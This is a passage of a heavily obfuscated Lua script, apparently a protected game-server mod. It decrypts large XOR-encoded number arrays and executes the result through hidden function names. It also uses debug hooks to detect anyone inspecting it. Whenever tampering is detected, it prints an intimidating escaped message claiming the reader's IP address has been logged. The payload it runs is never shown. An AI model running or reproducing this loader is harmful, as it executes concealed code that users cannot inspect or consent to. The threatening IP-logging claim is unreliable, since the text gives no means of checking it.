                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; ayhEEWgz8DJsZ7tsuj5R8CLwBrPMYPzTGHMTxxkLQne4iRBD9Yn2PhzvYTMkj7(
{ 910, 1044, 761, 1188, 1051, 727, 974, 697, 930, 798, 832, 611, 717, 689, 903, 1022, 1093, 737, 643, 615, 977, 775, 624,
  592, 645, 797, 911, 894, 1074, 568, 554, 804, 751, 1123, 1145, 999, 868, 906, 654, 1109, 581, 1046, 945, 1148, 709,
  1059, 582, 1114, 881, 710, 1211, 1149, 1029, 1020, 951, 1117, 880, 1118, 553, 844, 666, 1054, 644, 1043, 829, 1113,
  620, 638, 887, 997, 927, 1099, 1140, 943, 866, 924, 612, 656, 1000, 1181, 557, 1139, 901, 851, 838, 588, 595, 912, 732,
  1159, 770, 1092, 609, 929, 736, 676, 741, 1182, 831, 779, 742, 728, 788, 942, 817, 756, 1067, 649, 549, 1071, 933, 550,
  795, 619, 658, 1136, 786, 962, 694, 1115, 660, 878, 1035, 1036, 1073, 1028, 682, 1063, 744, 944, 552, 989, 1133, 636,
  916, 665, 647, 759, 703, 960, 1009, 677, 754, 782, 738, 893, 1104, 719, 1097, 1041, 1087, 807, 1021, 830, 925, 705,
  707, 543, 663, 622, 937, 1191, 772, 626, 601, 1018, 859, 731, 1034, 596, 1138, 607, 641, 616, 668, 852, 632, 608, 1146,
  606, 692, 688, 821, 1170, 1158, 1019, 971, 891, 876, 991, 716, 874, 814, 1202, 956, 848, 580, 1112, 572, 987, 1190,
  949, 1168, 1205, 1144, 963, 610, 585, 919, 1011, 966, 781, 720, 816, 630, 652, 940, 1023, 1200, 628, 975, 565, 1038,
  769, 823, 662, 1010, 637, 561, 780, 1024, 923, 865, 708, 1212, 579, 1106, 1198, 998, 667, 746, 726, 996, 1055, 982,
  1185, 812, 627, 1012, 935, 575, 752, 1081, 1083, 1089, 1110, 1164, 938, 939, 758, 766, 621, 908, 545, 1062, 739, 774,
  634, 1052, 653, 1186, 558, 1126, 777, 1206, 605, 969, 877, 740, 861, 745, 659, 875, 591, 1125, 1130, 764, 979, 640,
  1026, 559, 1156, 1210, 651, 845, 992, 547, 904, 958, 1199, 696, 729, 755, 1129, 905, 586, 1086, 1162, 1048, 771, 1131,
  809, 587, 1102, 633, 563, 569, 1068, 600, 642, 819, 1187, 862, 864, 753, 1076, 1057, 1085, 967, 952, 980, 972, 623,
  1045, 734, 551, 1079, 970, 822, 1004, 946, 1042, 765, 818, 1053, 672, 824, 1066, 594, 1141, 577, 1070, 598, 639, 548,
  602, 1175, 1078, 589, 986, 674, 625, 883, 902, 715, 1056, 837, 1121, 1142, 735, 1183, 1197, 921, 1171, 1108, 702, 1060,
  983, 1132, 570, 673, 597, 783, 1095, 957, 990, 918, 678, 773, 1204, 968, 973, 590, 988, 1111, 941, 712, 928, 1103, 725,
  618, 1157, 1049, 614, 1101, 1116, 617, 1189, 858, 953, 1135, 762, 1169, 1015, 684, 1192, 1105, 679, 695, 1163, 790,
  895, 555, 631, 1007, 839, 1088, 879, 1064, 747, 792, 635, 947, 1160, 965, 613, 713, 686, 834, 850, 896, 1152, 1001,
  730, 1094, 793, 914, 1047, 799, 698, 811, 934, 566, 749, 1161, 1003, 869, 959, 842, 1077, 629, 1127, 1153, 1030, 1151,
  890, 576, 1040, 810, 768, 1100, 900, 813, 843, 841, 920, 1016, 1180, 1150, 1090, 562, 1033, 1128, 794, 1017, 1174,
  1196, 1165, 926, 1122, 683, 1147, 847, 849, 981, 915, 556, 604, 785, 664, 1008, 718, 1058, 1025, 836, 767, 978, 1006,
  574, 835, 907, 886, 680, 787, 687, 1172, 685, 1209, 1050, 826, 1167, 1005, 1119, 722, 1082, 867, 889, 961, 1065, 704,
  560, 1194, 706, 950, 1032, 898, 828, 750, 1107, 701, 1037, 1061, -1, 108, 31, 85, 61, 109, 112, 79, 20, 110, 121, 13,
  26, 78, 60, 35, 87, 11, 8, 69, 87, 87, 56, 122, 46, 188, 26, 23, 99, 27, 124, 50, 6, 127, 5, 87, 118, 45, 82, 74, 16,
  45, 191, 88, 44, 95, 3, 23, 60, 58, 32, 91, 35, 20, 92, 89, 74, 226, 66, 93, 89, 22, 92, 37, 127, 114, 98, 87, 67, 68,
  81, 120, 23, 120, 75, 36, 53, 78, 3, 48, 30, 23, 25, 110, 86, 4, 80, 3, 92, 81, 16, 45, 28, 44, 64, 32, 48, 99, 102,
  105, 81, 87, 42, 18, 152, 66, 139, 84, 36, 81, 86, 29, 125, 241, 76, 202, 62, 54, 112, 140, 89, 126, 112, 17, 24, 11,
  80, 220, 5, 50, 5, 112, 76, 128, 85, 90, 110, 83, 95, 172, 9, 76, 81, 9, 50, 88, 71, 21, 212, 250, 86, 202, 26, 121,
  12, 28, 31, 55, 18, 32, 20, 7, 41, 76, 80, 65, 35, 21, 34, 211, 0, 23, 19, 23, 68, 37, 81, 10, 92, 234, 87, 165, 96,
  11, 20, 21, 110, 54, 119, 0, 40, 29, 76, 93, 119, 10, 11, 25, 18, 87, 22, 185, 21, 24, 27, 80, 116, 92, 80, 2, 86, 18,
  87, 62, 62, 193, 30, 81, 126, 60, 127, 152, 27, 23, 1, 20, 112, 99, 27, 43, 88, 29, 1, 55, 80, 2, 39, 61, 55, 21, 0,
  87, 140, 11, 5, 38, 31, 212, 79, 168, 9, 65, 99, 20, 8, 31, 26, 7, 161, 58, 4, 205, 8, 79, 108, 96, 95, 25, 91, 22, 3,
  79, 97, 206, 75, 83, 14, 25, 94, 84, 21, 112, 25, 179, 75, 53, 119, 3, 105, 71, 57, 1, 3, 44, 109, 121, 78, 78, 141,
  78, 53, 90, 26, 95, 15, 81, 67, 75, 42, 21, 105, 119, 35, 165, 34, 208, 31, 126, 240, 54, 44, 21, 80, 28, 75, 30, 47,
  66, 30, 75, 36, 119, 73, 9, 93, 21, 68, 20, 29, 3, 83, 18, 7, 212, 29, 112, 11, 66, 55, 93, 160, 42, 54, 90, 20, 121,
  100, 181, 56, 1, 4, 27, 66, 3, 29, 49, 55, 136, 121, 26, 29, 197, 27, 121, 79, 57, 30, 75, 81, 81, 253, 60, 98, 93, 23,
  24, 81, 107, 57, 204, 23, 28, 64, 121, 238, 72, 43, 18, 12, 19, 4, 110, 97, 112, 45, 52, 36, 125, 92, 121, 89, 109, 28,
  0, 69, 81, 91, 47, 78, 81, 25, 105, 150, 87, 117, 90, 7, 57, 2, 67, 101, 45, 28, 24, 61, 23, 87, 41, 87, 83, 111, 80,
  134, 241, 113, 94, 64, 63, 62, 73, 64, 62, 148, 133, 2, 26, 10, 13, 3, 93, 168, 2, 121, 121, 80, 81, 78, 36, 39, 126,
  26, 15, 238, 103, 81, 53, 73, 21, 44, 88, 54, 71, 3, 78, 91, 234, 91, 83, 107, 238, 74, 80, 80, 95, 98, 89, 74, 210,
  14, 62, 87, 20, 9, 113, 99, 8, 68, 77, 123, 9, 94, 78, 0, 70, 60, 25, 81, 109, 87, 53, 65, 32, 87, 86, 11, 48, 14, 86,
  80, 28, 81, 30, 55, 4, 2, 13, 101, 81, 55, 17, 1, 44, 131, 106, 88, 16, 109, 91, 20, 12, 80, 53, 121, 101, 193, 95, 71,
  33, 112, 7, 121, 5, 34, 28, 41, 125, 109, 80, 52, 79, 100, 24, 61, 55, 34, 81, 27, 121, 99, 15, 113, 93, 204, 95, 2,
  32, 74, 26, 27, 3, 74, 54, 208, 21, 87, 230, 77, 18, 82, 62, 79, 233, 64, 81, 84, 110, 26, 18, 109, 14, 75, 69, 200, 0,
  71, 64, 96, 88, 28, 22, 63, 18, 31, 79, 97, 83, 5, 78, 107, 78, 53, 245, 23, 87, 114, 87, 80, 216, 78, 53, 98, 73, 65,
  92, 40, 11, 64, 26, 70, 79, 15, 115, 96, 214, 19, 123, 96, 80, 109, 73, 19, 184, 14, 118, 15, 216, 69, 103, 76, 81, 7 },
  "sYY2oznqqnM4wpjCPywE7QlNqk"); hHDNFkXoI8f7ZXhYs20H95Hbao2S97YioLyYcuO1l5Kzm4dEF0uvmc =
shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl; xOPlDDIkURJTVn5Yc7u0HPMsjt5hzjqujHYvuzRghLWLCH3X449zIQLcJwQEtHj8WWg =
shZpOwknk8Aqdfq9XvU6xF0eYDs8aBiT3GR5QbBuYbWDiN3EeO5kDndLl; ah0I1Tda8Xd6VU2QczpzBe11OCqRjWJXWTpfQJeVphcWUWROlYtMMYqgFmhDATymca4r =
xOPlDDIkURJTVn5Yc7u0HPMsjt5hzjqujHYvuzRghLWLCH3X449zIQLcJwQEtHj8WWg; qVSLw9oRjFJ7ltE4EnBIWLahafK6arSZ2WeRTFXMaMEgWcStvzytpeaajf3sdGORlvwNwcb =
ah0I1Tda8Xd6VU2QczpzBe11OCqRjWJXWTpfQJeVphcWUWROlYtMMYqgFmhDATymca4r; holicYFRi7ew1AEJPGehxEGkzI20D4DRNJPI3a8XW4kdLGJ87RkmfxftU =
qVSLw9oRjFJ7ltE4EnBIWLahafK6arSZ2WeRTFXMaMEgWcStvzytpeaajf3sdGORlvwNwcb; pVfpxyEx7S5ysbsvidnh0S1FTzLtSlb1rcSVAnUd4qJC5i0htm1Qy4lQmnQWheItwaNf =
holicYFRi7ew1AEJPGehxEGkzI20D4DRNJPI3a8XW4kdLGJ87RkmfxftU; sR8YDwzgGLcShRwJZhVGM6HT8s66ETKeF76cWEYfU1BWn052Z9zxkdQmHTOsz =
pVfpxyEx7S5ysbsvidnh0S1FTzLtSlb1rcSVAnUd4qJC5i0htm1Qy4lQmnQWheItwaNf; cSdlSmUp8rslbkHrIhAdQYBmHsHh26bDVOejosKUxJHdaxg6QH0MQkpxedPlxO6jt9yTpzAn =
sR8YDwzgGLcShRwJZhVGM6HT8s66ETKeF76cWEYfU1BWn052Z9zxkdQmHTOsz; mVEV0iiAzKfcoWI2y6rs5fp22tgdtf8YB2dUFwuw07DyjAtPNXlJoeB2JzXS6KeuAePUbrR04O =
cSdlSmUp8rslbkHrIhAdQYBmHsHh26bDVOejosKUxJHdaxg6QH0MQkpxedPlxO6jt9yTpzAn; afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C =
mVEV0iiAzKfcoWI2y6rs5fp22tgdtf8YB2dUFwuw07DyjAtPNXlJoeB2JzXS6KeuAePUbrR04O; sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN = function(
  a)
  K, F = 1101441346693254, 16384 + 2091; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; yjYbA4X8MNhjdsZnBEwwXBEnSoWzTwQ4qc7VtX0F1Z7d4LIlwCb1v2M7X37iZq8fozOhW = function(b)
  co = coroutine.create(b)
  yiAKztwfc0d6Mi19jKeBY31xtJxBTXuX3PXhthCb1MiW5bZLczZe0 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(yiAKztwfc0d6Mi19jKeBY31xtJxBTXuX3PXhthCb1MiW5bZLczZe0, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return yiAKztwfc0d6Mi19jKeBY31xtJxBTXuX3PXhthCb1MiW5bZLczZe0
end; b3dxVYNigfa7HV0SVwRYfzD2AxHhMufvsaBL2W7dm4c4ic6RwqaMzVz9o0f3kfLpMfex6 = function(f, g)
  hRw9NwhHB0MNp1PnKq4hf13mKHs3VFfbJPTlcp0Ys4nENhPGBRAgwBTfdt4o91pdDi7 = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; kamoiUgYbjzYHMAQQDxnuH0piR1B13HfssWtfUUjTN1CFNTuJ6n4M9qhUJVbn = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; bnh0vJUKjdY9mFisqK03FaRU8QxZ2AE7egTJU0PIqvGuhF1E5c1SaKbTE7n = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      hRw9NwhHB0MNp1PnKq4hf13mKHs3VFfbJPTlcp0Ys4nENhPGBRAgwBTfdt4o91pdDi7(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; voNtyPh8Ou02JTImtDyLtoHlw5bptCQr1mxZixxLpJtQfHK5NQpZzhnN849CBz = function(p, n)
    yEwhrNtpo7TlkTjUmiPx3CiQi82YaoLBgM68i1srFvxcB18YE5HFxNmW = ""
    for k, q in pairs(p) do yEwhrNtpo7TlkTjUmiPx3CiQi82YaoLBgM68i1srFvxcB18YE5HFxNmW =
      yEwhrNtpo7TlkTjUmiPx3CiQi82YaoLBgM68i1srFvxcB18YE5HFxNmW ..
      afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C
      [sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('7E') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('2D') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('CF') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('A8') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('13') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('4A')]
      [sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('8E') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('F9') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('30') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('CF')](
      q) end
    ; n(yEwhrNtpo7TlkTjUmiPx3CiQi82YaoLBgM68i1srFvxcB18YE5HFxNmW)
  end; kamoiUgYbjzYHMAQQDxnuH0piR1B13HfssWtfUUjTN1CFNTuJ6n4M9qhUJVbn(f,
    function(r) bnh0vJUKjdY9mFisqK03FaRU8QxZ2AE7egTJU0PIqvGuhF1E5c1SaKbTE7n(r, g,
        function(s) voNtyPh8Ou02JTImtDyLtoHlw5bptCQr1mxZixxLpJtQfHK5NQpZzhnN849CBz(s,
            function(t) if #yjYbA4X8MNhjdsZnBEwwXBEnSoWzTwQ4qc7VtX0F1Z7d4LIlwCb1v2M7X37iZq8fozOhW(afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C[sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('B5') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('C2') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('30') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('3D')]) == 1 then if afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C[sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('B5') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('C2') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('30') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('3D')] == afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C[sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('71') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('CF') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('A8') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('13') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('2D')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C[sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('B5') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('C2') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('30') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('3D')](t) then
                    afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C
                        [sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('B5') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('C2') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('30') .. sfmRcpdVNRlmUJdgmccxiBOLy8BWVF36GH1iJDc8G3syD0SzKO2FmNA7Eak0hEN('3D')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; b3dxVYNigfa7HV0SVwRYfzD2AxHhMufvsaBL2W7dm4c4ic6RwqaMzVz9o0f3kfLpMfex6(
{ 888, 562, 816, 1206, 796, 743, 1061, 920, 558, 727, 902, 1162, 634, 1196, 712, 612, 1053, 990, 1103, 710, 971, 865,
  635, 854, 978, 688, 645, 595, 1197, 610, 1141, 638, 1124, 899, 1185, 601, 616, 1136, 1100, 669, 694, 659, 565, 735,
  966, 808, 1132, 665, 1194, 937, 682, 1209, 806, 1098, 801, 1173, 642, 1188, 690, 793, 555, 1182, 904, 977, 1093, 740,
  790, 773, 882, 757, 818, 766, 1104, 554, 549, 548, 1028, 1007, 892, 604, 693, 1032, 1023, 684, 930, 602, 1116, 872,
  1045, 1129, 767, 969, 570, 850, 814, 870, 946, 1090, 750, 791, 746, 1169, 754, 822, 991, 898, 1171, 738, 1131, 893,
  949, 722, 1052, 619, 1144, 698, 729, 943, 993, 624, 654, 561, 606, 644, 1025, 772, 960, 1123, 1201, 625, 935, 699, 900,
  1191, 560, 832, 956, 723, 1165, 962, 563, 784, 825, 1158, 776, 596, 691, 874, 889, 768, 855, 843, 632, 951, 1011, 769,
  597, 676, 674, 1015, 646, 672, 1078, 931, 608, 901, 857, 574, 1065, 856, 708, 928, 1152, 970, 859, 732, 853, 1151, 842,
  945, 833, 980, 792, 662, 894, 620, 919, 953, 1030, 764, 568, 666, 1211, 678, 578, 1189, 664, 839, 667, 939, 1009, 559,
  686, 651, 721, 611, 789, 1056, 1080, 652, 1113, 1096, 802, 835, 567, 1012, 745, 1005, 1062, 591, 1179, 1193, 800, 683,
  599, 716, 1001, 780, 572, 1031, 844, 1180, 983, 891, 577, 1203, 747, 861, 1079, 864, 1111, 877, 876, 677, 603, 875,
  1071, 831, 836, 650, 756, 841, 1038, 1119, 1076, 982, 771, 827, 617, 1091, 881, 703, 788, 1212, 996, 1072, 1163, 1112,
  1094, 907, 714, 959, 557, 731, 967, 923, 906, 744, 1192, 1139, 794, 849, 878, 964, 1184, 709, 1198, 581, 1063, 1058,
  913, 1178, 1107, 1149, 1074, 998, 706, 1060, 758, 1202, 834, 615, 911, 1147, 582, 787, 1013, 679, 886, 1157, 1082,
  1155, 675, 1067, 1021, 704, 1120, 580, 621, 795, 810, 762, 1121, 912, 1200, 811, 593, 1117, 715, 955, 614, 718, 1105,
  813, 819, 701, 958, 1127, 1159, 636, 1187, 858, 1160, 1040, 725, 829, 779, 968, 1176, 719, 995, 979, 879, 805, 944,
  1138, 797, 1026, 963, 903, 965, 1092, 916, 896, 838, 1084, 1130, 922, 1085, 1010, 786, 1073, 866, 1137, 887, 1097, 909,
  815, 885, 1043, 626, 655, 564, 1168, 845, 972, 629, 680, 869, 1099, 1086, 809, 994, 1205, 545, 830, 1114, 761, 1175,
  547, 974, 1042, 742, 782, 724, 932, 770, 929, 905, 730, 1143, 821, 1051, 1102, 914, 1177, 728, 984, 1083, 749, 871,
  1044, 1066, 823, 590, 657, 817, 755, 663, 999, 571, 576, 1016, 637, 1020, 1153, 705, 1033, 1077, 884, 781, 647, 1059,
  643, 653, 948, 973, 700, 1118, 976, 544, 765, 649, 1142, 828, 897, 553, 1022, 1122, 733, 1002, 1154, 777, 752, 741,
  1087, 824, 639, 736, 1133, 938, 1190, 925, 622, 1210, 689, 910, 648, 1027, 890, 609, 1170, 1054, 798, 760, 687, 1049,
  1126, 587, 579, 867, 860, 1146, 847, 660, 1172, 918, 1050, 807, 840, 671, 1081, 1003, 586, 942, 1148, 739, 1140, 989,
  1008, 915, 696, 1048, 670, 1156, 924, 550, 583, 1135, 785, 1069, 717, 1037, 543, 681, 862, 1208, 1046, 936, 950, 585,
  1057, 1036, 927, 546, 1181, 630, 883, 986, 697, 1125, 975, -1, 54, 14, 86, 66, 36, 117, 102, 36, 12, 215, 74, 105, 0,
  29, 54, 33, 111, 86, 100, 96, 25, 73, 111, 242, 66, 92, 64, 95, 1, 21, 128, 64, 77, 14, 22, 113, 118, 1, 64, 29, 112,
  237, 53, 97, 71, 52, 6, 73, 16, 41, 17, 156, 95, 8, 80, 212, 111, 32, 34, 67, 82, 92, 206, 65, 177, 69, 99, 123, 126,
  20, 73, 73, 20, 18, 57, 251, 97, 116, 92, 85, 244, 21, 92, 111, 23, 73, 51, 104, 129, 117, 36, 17, 52, 16, 60, 7, 51,
  183, 141, 4, 30, 112, 11, 81, 118, 97, 19, 91, 113, 23, 101, 111, 121, 154, 97, 121, 65, 66, 128, 2, 99, 90, 58, 102,
  99, 21, 67, 52, 80, 64, 129, 98, 78, 5, 105, 83, 56, 121, 24, 122, 65, 26, 34, 85, 55, 34, 17, 19, 61, 33, 63, 66, 64,
  61, 50, 23, 86, 7, 121, 65, 89, 54, 71, 80, 229, 69, 38, 106, 143, 19, 15, 21, 69, 121, 16, 119, 126, 11, 109, 84, 17,
  15, 80, 170, 53, 13, 49, 127, 17, 123, 45, 215, 58, 74, 204, 53, 99, 11, 35, 121, 26, 53, 20, 59, 53, 167, 115, 23,
  183, 108, 35, 52, 84, 96, 58, 111, 29, 42, 17, 36, 32, 9, 111, 51, 47, 44, 113, 59, 50, 92, 18, 23, 120, 3, 21, 177, 1,
  50, 63, 4, 5, 26, 118, 87, 62, 43, 104, 11, 58, 69, 90, 72, 17, 16, 73, 65, 92, 66, 101, 69, 223, 188, 65, 66, 18, 127,
  68, 1, 17, 191, 118, 104, 67, 32, 80, 6, 97, 95, 120, 57, 17, 46, 99, 105, 60, 34, 69, 28, 23, 30, 125, 4, 68, 18, 188,
  6, 70, 127, 118, 121, 103, 46, 1, 111, 118, 42, 49, 73, 127, 48, 64, 55, 64, 79, 67, 54, 78, 121, 1, 17, 140, 4, 48,
  73, 97, 100, 54, 117, 86, 50, 241, 42, 28, 26, 84, 36, 66, 90, 16, 111, 112, 61, 66, 105, 80, 104, 65, 84, 30, 18, 19,
  124, 91, 57, 17, 87, 29, 42, 102, 4, 118, 23, 1, 38, 50, 70, 99, 73, 33, 16, 18, 122, 46, 57, 248, 32, 90, 92, 129,
  110, 7, 50, 86, 28, 79, 80, 58, 80, 22, 0, 19, 77, 104, 78, 53, 108, 126, 100, 99, 80, 10, 111, 104, 73, 41, 32, 2, 6,
  126, 141, 82, 98, 121, 92, 23, 122, 23, 36, 252, 97, 71, 45, 97, 11, 7, 36, 67, 107, 71, 57, 2, 8, 50, 95, 84, 57, 67,
